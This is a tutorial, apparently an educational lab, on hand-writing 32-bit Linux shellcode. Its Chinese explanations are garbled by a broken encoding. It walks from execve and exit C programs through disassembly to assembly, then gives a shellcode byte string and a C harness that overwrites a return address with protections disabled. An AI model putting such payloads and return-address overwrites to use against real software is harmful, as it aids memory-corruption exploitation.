�1�3#����shellcode
##0x00 ��дmain.c exitfunc.c
***main***
```c
#include<stdio.h>
int main() {
    char *name[2];
    name[0] = "/usr/bin/python";
    name[1] = NULL;
    execve(name[0], name, NULL);
    return 0;
}
```
***exitfunc***
```c
#include <stdlib.h>
int main() {
    exit(0);
    return 0;
}
```
##0x01 main�����
***main***
>![image](./screenshots/main.png)
��3�� 16λ����
��4�� ջ��ָ������32�ֽڣ�Ϊ��������λ��
��5�� "/usr/bin/python"�ַ�����ַѹ��esp + 0x18��24��λ��
��6�� 0x0ѹ��esp + 0x1c��28��λ��
��7�� ��"/usr/bin/python"���ַ�����ַmov��eax�Ĵ���
��8�� ��NULL mov��esp + 0x8��8��λ�ã���һ��������ջ������������Ϊname[0], name, NULL��
��9�� ��name��ַ����edx
��10�� ��edx�����ݣ�Ҳ����name�ĵ�ַmov��esp + 0x04��4��(�ڶ���������ջ)
��11�� ��eax�����ݣ�Ҳ����"/usr/bin/python"���ַ�����ַmov��esp��0������һ��������ջ��
��12�� call execve
��13~�� ���أ��˳�

***execve***
>![image](./screenshots/execve.png)
��1�� ���ú�����ͬʱջ������ret��ջ��ebx��ջ��esp = esp - 0x8
��2�� NULL mov��edx����������������Ϊջ���ƶ���8�ֽڣ����Ե�ַ��esp + 0x8��8�����esp + 0x10��16����
��3�� ��name��ֵmov��ecx���ڶ�����������ַ��esp + 0x04��4�����esp + 0xc��12����
��4�� ��&name[0]��Ҳ����"/usr/bin/python"�ַ����ĵ�ַmov��ebx����һ����������ַ��esp���esp + 0x8��8����
��5�� ��0xb mov��eax������int 0x80�жϡ�
��6~17�� ִ�в����ص�main������

***����int 0x80***
- ��Ҫ��"/usr/bin/python"�ַ�����ַmov��ebx
- name�ĵ�ַ�ŵ�ecx
- NULL��ֵ�ŵ�edx
- 0xb����eax
- Ȼ�����int 0x80�ж�

##0x02 exitfunc�����
***exit��0��***
>![image](./screenshots/exitfunc.png)
�˳������᷵��һ���������������մ�����ebx�У��������0��Ԥʾ�ź���û�г���ϵͳ0x1���ò���������eax��Ȼ�����int 0x80�ж�

##0x03 ����shellcode
- ��"/usr/bin/python"�ַ����ĵ�ַ�ŵ�ebx
- ȷ�����ַ�����'\0'��β
- ��"/usr/bin/python"��ַ����name[0]
- ��һ�����ֽڵ�NULLֵ����name[1]
- name��ֵ�ŵ�ecx
- NULL����edx
- 0xb����eax
- ����int 0x80�ж�
- �洢0x0��ebx
- �洢0x1��eax
- ����int 0x80�ж�

��д�����룺
```asm
main:
    jmp  main + 0x2f
    popl %ebx
    movb $0x0, 0xf(%ebx)
    movl %ebx, 0x10(%ebx)
    movl $0x0, 0x14(%ebx)
    movl $0x0, %edx
    leal 0x10(%ebx), %ecx
    movl $0xb, %eax
    int  $0x80
    movl $0x0, %ebx
    movl $0x1, %eax
    int  $0x80
    call main + 0x5
    .string "/usr/bin/python"
.globl main
    .type main, @function
```
ִ��gcc -m32 -g -o shellcodes shellcodes.s�����ʱ�õ���shellcodes������ֱ�����У���Ϊϵͳ����������޸�������롣
ִ��objdump -d shellcodes | grep -A20 &apos;&lt;main&gt;&apos;���
>![image](./screenshots/objdump.png)

��дshellcode c���Գ�����в���
```c
char shellcode[] = "\xe9\x2a\x00\x00\x00\x5b\xc6\x43\x0f\x00"
  "\x89\x5b\x10\xc7\x43\x14\x00\x00\x00\x00\xba\x00\x00\x00\x00"
  "\x8d\x4b\x10\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00"
  "\xb8\x01\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff/usr/bin/python";

void shell() {
  int *ret; 
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}

int main() { 
   shell();
   return 0;
}
```
ִ��gcc -g -m32 -z execstack -fno-stack-protector shellcode.c -o shellcode���б���
>![image](./screenshots/result.png)
